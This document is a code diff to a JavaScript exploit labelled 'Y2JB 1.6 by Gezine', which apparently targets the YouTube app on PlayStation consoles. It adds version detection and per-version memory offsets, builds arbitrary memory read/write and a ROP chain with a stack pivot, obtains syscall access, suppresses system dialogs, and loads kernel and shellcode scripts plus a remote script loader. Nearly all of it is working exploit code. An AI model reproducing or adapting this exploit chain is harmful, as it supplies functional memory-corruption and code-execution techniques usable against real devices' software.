@@ -5,7 +5,7 @@
     of the MIT license.  See the LICENSE file for details.
 */
 
-const version_string = "Y2JB 1.5 v2 by Gezine";
+const version_string = "Y2JB 1.6 by Gezine";
 
 function load_localscript(src) {
     return new Promise((resolve, reject) => {
@@ -688,14 +688,57 @@ function trigger() {
         const stack_addr = addrof(pwn(1)) + 0x1n;
         await log("Stack leak @ " + toHex(stack_addr));
         
-        eboot_base = read64(stack_addr + 0x8n) - 0xFBC81Fn;
-        await log("eboot_base @ " + toHex(eboot_base));
+        const text_leak = read64(stack_addr + 0x8n);
+        await log("Text leak @ " + toHex(text_leak));
+        const text_leak_mask = text_leak & 0xFFFn;
         
-        libc_base = read64(eboot_base + 0x2A66660n) - 0x851A0n;
-        await log("libc_base @ " + toHex(libc_base));
+        if (text_leak_mask == 0x81Fn) {
+            Y2_VERSION = "01.000.003 (min fw 4.03)";
+            await log("Youtube " + Y2_VERSION + " detected");
+            Y2_OFFSET = Y2_OFFSET_403;
+            ROP = ROP_403;
+            
+            eboot_base = read64(stack_addr + 0x8n) - Y2_OFFSET.EBOOT_LEAK;
+            await log("eboot_base @ " + toHex(eboot_base));
+
+            libc_base = read64(eboot_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
+            await log("libc_base @ " + toHex(libc_base));
+            
+        } else if (text_leak_mask == 0xFDFn) {
+            Y2_VERSION = "01.000.030 (min fw 12.02)";
+            await log("Youtube " + Y2_VERSION + " detected");
+            Y2_OFFSET = Y2_OFFSET_1220;
+            ROP = ROP_1220;
+
+            libcobalt_base = read64(stack_addr + 0x8n) - Y2_OFFSET.LIBCOBALT_LEAK;
+            await log("libcobalt_base @ " + toHex(libcobalt_base));
+            
+            libstarboard_base = read64(libcobalt_base + Y2_OFFSET.LIBSTARBOARD_LEAK1) - Y2_OFFSET.LIBSTARBOARD_LEAK2;
+            await log("libstarboard_base @ " + toHex(libstarboard_base));
+            
+            libc_base = read64(libstarboard_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
+            await log("libc_base @ " + toHex(libc_base));
+            
+        } else if (text_leak_mask == 0x73fn) {
+            Y2_VERSION = "01.009.202 (min fw 13.20)";
+            await log("Youtube " + Y2_VERSION + " detected");
+            Y2_OFFSET = Y2_OFFSET_1320;
+            ROP = ROP_1320;
+
+            libcobalt_base = read64(stack_addr + 0x8n) - Y2_OFFSET.LIBCOBALT_LEAK;
+            await log("libcobalt_base @ " + toHex(libcobalt_base));
+            
+            libstarboard_base = read64(libcobalt_base + Y2_OFFSET.LIBSTARBOARD_LEAK1) - Y2_OFFSET.LIBSTARBOARD_LEAK2;
+            await log("libstarboard_base @ " + toHex(libstarboard_base));
+            
+            libc_base = read64(libstarboard_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
+            await log("libc_base @ " + toHex(libc_base));
+        } else {
+            throw new Error("UNSUPPORTED YOUTUBE VERSION");
+        }
         
         const rop_chain_addr = get_backing_store(rop_chain);
-        //await log("ROP chain @ " + toHex(rop_chain_addr));
+        await log("ROP chain @ " + toHex(rop_chain_addr));
         
         // Fake bytecode for r14 register
         fake_bc[0] = 0xABn; // Return opcode - keeps interpreter happy
@@ -712,9 +755,11 @@ function trigger() {
 
         const fake_frame_addr = addrof(fake_frame);
         // Pivot RSP
-        write64(fake_frame_addr + 0x09n, ROP.pop_rsp); // pop rsp ; ret
-        write64(fake_frame_addr + 0x11n, rop_chain_addr);
-
+        write64(fake_frame_addr + 0x9n, ROP.pop_rsp); // pop rsp ; ret
+        write64(fake_frame_addr + 0x9n + Y2_OFFSET.RSP_OFFSET, rop_chain_addr);
+        
+        await log("fake_frame_addr @ " + toHex(fake_frame_addr));
+        
         call_rop = function(address, rax = 0x0n, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
             let rop_i = 0;
             
@@ -755,7 +800,6 @@ function trigger() {
             return pwn(fake_frame);
         }
         
-        
         call = function(address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {                    
             // GC friendly
             // Get new bytecode_addr each time
@@ -772,100 +816,30 @@ function trigger() {
             return return_value_buf[0];
         }
         
+        await log("ROP test, should see 0x0000000200000000");
+        
         rop_test = call(ROP.mov_rax_0x200000000);
-        await log("ROP test, should see 0x0000000200000000 : " + toHex(rop_test));
+        await log(toHex(rop_test));
         
         if (rop_test !== 0x200000000n) {
             await log("ERROR: ROP test failed");
             throw new Error("ROP test failed");
         }
-        
-        // Thanks ufm42 for better implementation
-        await log("Disabling PSN dialog and YouTube splash...");
-
-        const window_addr = addrof(window);
-        //await log("window_addr: " + toHex(window_addr));
-        
-        const wrapper_private_addr = read64(window_addr + 0x20n);
-        //await log("wrapper_private_addr: " + toHex(wrapper_private_addr));
-        
-        const isolate_addr = read64(wrapper_private_addr + 0x8n);
-        //await log("isolate_addr: " + toHex(isolate_addr));
-        
-        const splash_screen_dom_window_addr = read64(wrapper_private_addr + 0x10n);
-        //await log("splash_screen_dom_window_addr: " + toHex(splash_screen_dom_window_addr));
-        
-        const navigator_addr = read64(splash_screen_dom_window_addr + 0xC0n);
-        //await log("navigator_addr: " + toHex(navigator_addr));
-        
-        const maybe_freeze_callback_addr = read64(navigator_addr + 0xB0n);
-        //await log("maybe_freeze_callback_addr: " + toHex(maybe_freeze_callback_addr));
-        
-        const browser_module_addr = read64(maybe_freeze_callback_addr + 0x30n);
-        //await log("browser_module_addr: " + toHex(browser_module_addr));
-        
-        const main_web_module_addr = read64(browser_module_addr + 0x678n);
-        //await log("main_web_module_addr: " + toHex(main_web_module_addr));
-        
-        const main_web_module_impl_addr = read64(main_web_module_addr + 0x18n);
-        //await log("main_web_module_impl_addr: " + toHex(main_web_module_impl_addr));
-        
-        const main_dom_window_addr = read64(main_web_module_impl_addr + 0x230n);
-        //await log("main_dom_window_addr: " + toHex(main_dom_window_addr));
-        
-        const splash_screen_addr = read64(browser_module_addr + 0x898n);
-        //await log("splash_screen_addr: " + toHex(splash_screen_addr));
-        
-        const splash_screen_web_module_addr = read64(splash_screen_addr + 0x20n);
-        //await log("splash_screen_web_module_addr: " + toHex(splash_screen_web_module_addr));
-        
-        const splash_screen_web_module_impl_addr = read64(splash_screen_web_module_addr + 0x18n);
-        //await log("splash_screen_web_module_impl_addr: " + toHex(splash_screen_web_module_impl_addr));
-
-        //await log("Disabling YouTube splash screen...");
-        const main_web_module_generation_addr = browser_module_addr + 0xB08n;
-        write32(main_web_module_generation_addr, 0xFFFFFFFFn);
-        await log("YT splash disabled!");
-
-        await log("Disabling PSN popup...");
-/*       
-        // Get sceCommonDialogInitialize address and find libSceCommonDialog base
-        const sceCommonDialogInitialize_addr = read64(eboot_base + 0x2A65F98n);
-        //await log("sceCommonDialogInitialize_addr: " + toHex(sceCommonDialogInitialize_addr));
-        
-        const sceCommonDialogTerminate_addr = sceCommonDialogInitialize_addr + 0x70n;
-        call(sceCommonDialogTerminate_addr);
-*/
-        const sceMsgDialogTerminate_addr = eboot_base + 0x215DEB0n;
-        call(sceMsgDialogTerminate_addr);
-
-        // Disable "no internet connection" retry timer
-        const on_error_retry_timer_addr = browser_module_addr + 0x960n;
-        //await log("on_error_retry_timer_addr: " + toHex(on_error_retry_timer_addr));
-        
-        const is_running_addr = on_error_retry_timer_addr + 0x60n;
-        //await log("is_running_addr: " + toHex(is_running_addr));
-        
-        // Set is_running to 1 (true)
-        write8(is_running_addr, 0x1n);
-        
-        await log("PSN popup disabled!");
 
         // https://github.com/shahrilnet/remote_lua_loader/blob/22a03e38b6e8f13e2e379f7c5036767c14162ff3/savedata/syscall.lua#L42
-        sceKernelGetModuleInfoFromAddr = read64(libc_base + 0x113C08n);
-        //await log("sceKernelGetModuleInfoFromAddr @ " + toHex(sceKernelGetModuleInfoFromAddr));
+        const sceKernelGetModuleInfoFromAddr_addr = read64(Y2_OFFSET.sceKernelGetModuleInfoFromAddr);
         
         //gettimeofday plt
         //0x113B18
-        const gettimeofdayAddr = read64(libc_base + 0x113B18n);
-        //await log("gettimeofdayAddr @: " + toHex(gettimeofdayAddr));
+        const gettimeofday_addr = read64(Y2_OFFSET.gettimeofday);
+        //await log("gettimeofday_addr @: " + toHex(gettimeofday_addr));
         
         const mod_info = malloc(0x300);
         //await log("mod_info buffer @ " + toHex(mod_info));
         
         const SEGMENTS_OFFSET = 0x160n;
         
-        ret = call(sceKernelGetModuleInfoFromAddr, gettimeofdayAddr, 0x1n, mod_info);
+        ret = call(sceKernelGetModuleInfoFromAddr_addr, gettimeofday_addr, 0x1n, mod_info);
         //await log("sceKernelGetModuleInfoFromAddr returned: " + toHex(ret));
 
         if (ret !== 0x0n) {
@@ -876,7 +850,7 @@ function trigger() {
         libkernel_base = read64(mod_info + SEGMENTS_OFFSET);
         //await log("libkernel_base @ " + toHex(libkernel_base));
 
-        syscall_wrapper = gettimeofdayAddr + 0x7n;
+        syscall_wrapper = gettimeofday_addr + 0x7n;
         //await log("syscall_wrapper @ " + toHex(syscall_wrapper));
         
         syscall = function(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
@@ -896,30 +870,110 @@ function trigger() {
             return return_value_buf[0];
         }
         
-        libc_strerror = libc_base + 0x73520n;
-        libc_error = libc_base + 0xCC5A0n;
+        libc_strerror = Y2_OFFSET.libc_strerror;
+        libc_error = Y2_OFFSET.libc_error;
+        
+        Thrd_create = Y2_OFFSET.Thrd_create;
+        Thrd_join = Y2_OFFSET.Thrd_join;
         
         await load_localscript('misc.js');
         await checkLogServer();
+
+        if (Y2_OFFSET === Y2_OFFSET_403) {
+            // Thanks ufm42 for better implementation
+            await log("Disabling PSN dialog and YouTube splash...");
+    
+            const window_addr = addrof(window);
+            //await log("window_addr: " + toHex(window_addr));
+            
+            const wrapper_private_addr = read64(window_addr + 0x20n);
+            //await log("wrapper_private_addr: " + toHex(wrapper_private_addr));
+            
+            const isolate_addr = read64(wrapper_private_addr + 0x8n);
+            //await log("isolate_addr: " + toHex(isolate_addr));
+            
+            const splash_screen_dom_window_addr = read64(wrapper_private_addr + 0x10n);
+            //await log("splash_screen_dom_window_addr: " + toHex(splash_screen_dom_window_addr));
+            
+            const navigator_addr = read64(splash_screen_dom_window_addr + 0xC0n);
+            //await log("navigator_addr: " + toHex(navigator_addr));
+            
+            const maybe_freeze_callback_addr = read64(navigator_addr + 0xB0n);
+            //await log("maybe_freeze_callback_addr: " + toHex(maybe_freeze_callback_addr));
+            
+            const browser_module_addr = read64(maybe_freeze_callback_addr + 0x30n);
+            //await log("browser_module_addr: " + toHex(browser_module_addr));
+            
+            const main_web_module_addr = read64(browser_module_addr + 0x678n);
+            //await log("main_web_module_addr: " + toHex(main_web_module_addr));
+            
+            const main_web_module_impl_addr = read64(main_web_module_addr + 0x18n);
+            //await log("main_web_module_impl_addr: " + toHex(main_web_module_impl_addr));
+            
+            const main_dom_window_addr = read64(main_web_module_impl_addr + 0x230n);
+            //await log("main_dom_window_addr: " + toHex(main_dom_window_addr));
+            
+            const splash_screen_addr = read64(browser_module_addr + 0x898n);
+            //await log("splash_screen_addr: " + toHex(splash_screen_addr));
+            
+            const splash_screen_web_module_addr = read64(splash_screen_addr + 0x20n);
+            //await log("splash_screen_web_module_addr: " + toHex(splash_screen_web_module_addr));
+            
+            const splash_screen_web_module_impl_addr = read64(splash_screen_web_module_addr + 0x18n);
+            //await log("splash_screen_web_module_impl_addr: " + toHex(splash_screen_web_module_impl_addr));
+    
+            await log("Disabling YouTube splash screen...");
+            const main_web_module_generation_addr = browser_module_addr + 0xB08n;
+            write32(main_web_module_generation_addr, 0xFFFFFFFFn);
+            await log("YT splash disabled!");
+    
+            await log("Disabling PSN popup...");
+            
+            call(read64(Y2_OFFSET.sceMsgDialogTerminate));
+                    
+            // Disable "no internet connection" retry timer
+            const on_error_retry_timer_addr = browser_module_addr + 0x960n;
+            //await log("on_error_retry_timer_addr: " + toHex(on_error_retry_timer_addr));
+            
+            const is_running_addr = on_error_retry_timer_addr + 0x60n;
+            //await log("is_running_addr: " + toHex(is_running_addr));
+            
+            // Set is_running to 1 (true)
+            write8(is_running_addr, 0x1n);
+            
+            await log("PSN popup disabled!");
+            
+        } else {
+            
+            // This is voodoo hack
+            await log("Disabling PSN and no internet popup...");
+            
+            const sceMsgDialogTerminate   = read64(Y2_OFFSET.sceMsgDialogTerminate);
+            const sceErrorDialogTerminate = read64(Y2_OFFSET.sceErrorDialogTerminate);
+            
+            const timespec = malloc(0x10);
+            write64(timespec,      0n);       // tv_sec  = 0
+            write64(timespec + 8n, 1000000n); // tv_nsec = 1ms
+                        
+            while (call(sceMsgDialogTerminate) !== 0n) {
+                call(sceErrorDialogTerminate);
+                syscall(SYSCALL.nanosleep, timespec);
+            }
+            
+            await log("Popup disabled!");
+        }
+        
         
         FW_VERSION = get_fwversion();
         TITLE_ID = get_title_id();
         
-        send_notification(version_string + "\nFW : " + FW_VERSION + "\nTitle ID : " + TITLE_ID);
+        send_notification(version_string + "\nFW : " + FW_VERSION + "\nTitle ID : " + TITLE_ID + "\nAppVer : " + Y2_VERSION);
         await log("FW detected : " + FW_VERSION);
         await log("Title ID detected : " + TITLE_ID);
+        await log("AppVer detected : " + Y2_VERSION);
         
         await log("libkernel_base @ " + toHex(libkernel_base));
-        
-        // Used for gpu rw
-        sceKernelAllocateMainDirectMemory = read64(eboot_base + 0x2A65EF8n);
-        // Same thing with sceKernelMapDirectMemory but with name assigning.
-        // Using this because don't want to use dlsym
-        sceKernelMapNamedDirectMemory = read64(eboot_base + 0x2A65F00n); 
-        
-        Thrd_create = libc_base + 0x4BF0n;
-        Thrd_join = libc_base + 0x49F0n;
-        
+
         await load_localscript('kernel.js');
         await load_localscript('aioshellcode.js');
         
@@ -927,7 +981,8 @@ function trigger() {
         // MAIN EXECUTION //
         ////////////////////
 
-        await load_localscript('remotejsloader.js');
+        await load_localscript('remotejsloader.js'); 
+
         
     } catch (e) {                
         await log('EXCEPTION: ' + e.message);
